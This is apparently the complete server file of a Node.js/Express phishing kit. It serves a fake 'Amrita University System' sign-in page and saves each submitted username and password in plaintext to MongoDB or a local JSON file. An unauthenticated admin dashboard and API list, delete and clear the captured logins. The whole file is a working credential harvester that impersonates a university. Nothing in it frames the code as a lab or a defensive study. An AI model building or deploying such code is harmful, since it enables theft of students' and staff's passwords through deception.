const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const Credential = require('./models/Credential');

const app = express();
const PORT = process.env.PORT || 8000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve Static Files directly from root directory
app.use(express.static(path.join(__dirname)));

// -------------------------------------------------------------
// Local JSON File Database Fallback (when Atlas is offline)
// -------------------------------------------------------------
const fs = require('fs');
const localDbPath = path.join(__dirname, 'credentials.json');

// Helper to retrieve local credentials from disk
const getLocalRecords = () => {
    try {
        if (fs.existsSync(localDbPath)) {
            const data = fs.readFileSync(localDbPath, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {
        console.error('Error reading local JSON database:', e);
    }
    return [];
};

// Helper to save local credentials to disk
const saveLocalRecords = (records) => {
    try {
        fs.writeFileSync(localDbPath, JSON.stringify(records, null, 2), 'utf8');
    } catch (e) {
        console.error('Error writing local JSON database:', e);
    }
};

// -------------------------------------------------------------
// MongoDB Connection
// -------------------------------------------------------------
const MONGODB_URI = process.env.MONGODB_URI;

console.log('Attempting to connect to MongoDB Atlas...');
mongoose.connect(MONGODB_URI)
    .then(() => {
        console.log('Successfully connected to MongoDB Atlas database.');
    })
    .catch((error) => {
        console.error('MongoDB Atlas Connection Error:');
        console.error(error.message);
        console.log('\n[Warning]: Running server with Local JSON Database Fallback. Please specify a valid MONGODB_URI in your .env file to enable Atlas sync.');
    });

// -------------------------------------------------------------
// API Routes
// -------------------------------------------------------------

// 1. Submit Login Credentials (stores incoming logins)
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username and password are required' 
            });
        }

        const isDbConnected = mongoose.connection.readyState === 1;

        if (isDbConnected) {
            // Save to MongoDB Atlas
            const newCredential = new Credential({ username, password });
            await newCredential.save();
            console.log(`[Atlas Database Log]: Logged attempt from user "${username}"`);
        } else {
            // Save to Local JSON File Fallback
            const records = getLocalRecords();
            const newRecord = {
                _id: 'local_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
                username,
                password,
                timestamp: new Date().toISOString()
            };
            records.unshift(newRecord);
            saveLocalRecords(records);
            console.log(`[Local Database Log]: Logged attempt from user "${username}" locally`);
        }

        return res.status(201).json({
            success: true,
            message: 'Credentials successfully logged'
        });
    } catch (err) {
        console.error('Error logging credentials:', err);
        return res.status(500).json({
            success: false,
            message: 'Internal server error while logging credentials',
            error: err.message
        });
    }
});

// 2. Fetch All Saved Login Records (used by admin dashboard)
app.get('/api/admin/credentials', async (req, res) => {
    try {
        const isDbConnected = mongoose.connection.readyState === 1;
        let records = [];

        if (isDbConnected) {
            records = await Credential.find().sort({ timestamp: -1 });
        } else {
            records = getLocalRecords();
        }

        return res.status(200).json({
            success: true,
            count: records.length,
            data: records,
            dbConnected: isDbConnected
        });
    } catch (err) {
        console.error('Error retrieving credentials:', err);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve academic records',
            error: err.message
        });
    }
});

// 3. Delete Specific Login Record
app.delete('/api/admin/credentials/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const isDbConnected = mongoose.connection.readyState === 1;
        let deleted = false;

        if (isDbConnected && !id.startsWith('local_')) {
            const result = await Credential.findByIdAndDelete(id);
            if (result) deleted = true;
        } else {
            const records = getLocalRecords();
            const filtered = records.filter(r => r._id !== id);
            if (records.length !== filtered.length) {
                saveLocalRecords(filtered);
                deleted = true;
            }
        }
        
        if (!deleted) {
            return res.status(404).json({
                success: false,
                message: 'Record not found or already deleted'
            });
        }

        console.log(`[Database Log]: Deleted credential record ID ${id}`);
        return res.status(200).json({
            success: true,
            message: 'Record successfully deleted'
        });
    } catch (err) {
        console.error('Error deleting credential record:', err);
        return res.status(500).json({
            success: false,
            message: 'Failed to delete record',
            error: err.message
        });
    }
});

// 4. Clear All Login Records
app.delete('/api/admin/credentials', async (req, res) => {
    try {
        const isDbConnected = mongoose.connection.readyState === 1;
        let clearedCount = 0;

        if (isDbConnected) {
            const cleared = await Credential.deleteMany({});
            clearedCount = cleared.deletedCount;
            // Also purge local fallback records if database is cleared
            saveLocalRecords([]);
        } else {
            const records = getLocalRecords();
            clearedCount = records.length;
            saveLocalRecords([]);
        }

        console.log(`[Database Log]: Database cleared of all ${clearedCount} records`);
        return res.status(200).json({
            success: true,
            message: `Cleared all ${clearedCount} credentials successfully`
        });
    } catch (err) {
        console.error('Error clearing database:', err);
        return res.status(500).json({
            success: false,
            message: 'Failed to clear academic logs database',
            error: err.message
        });
    }
});

// -------------------------------------------------------------
// Frontend Route Handlers
// -------------------------------------------------------------

// Serve main sign-in landing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve the admin credentials viewer page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Handle 404 routes
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

// Start listening
if (process.env.NODE_ENV !== 'production') {
    app.listen(PORT, () => {
        console.log(`\n======================================================`);
        console.log(` Amrita University System Backend Active`);
        console.log(` Listening on: http://localhost:${PORT}`);
        console.log(` Access Admin Dashboard: http://localhost:${PORT}/admin`);
        console.log(`======================================================\n`);
    });
}

module.exports = app;
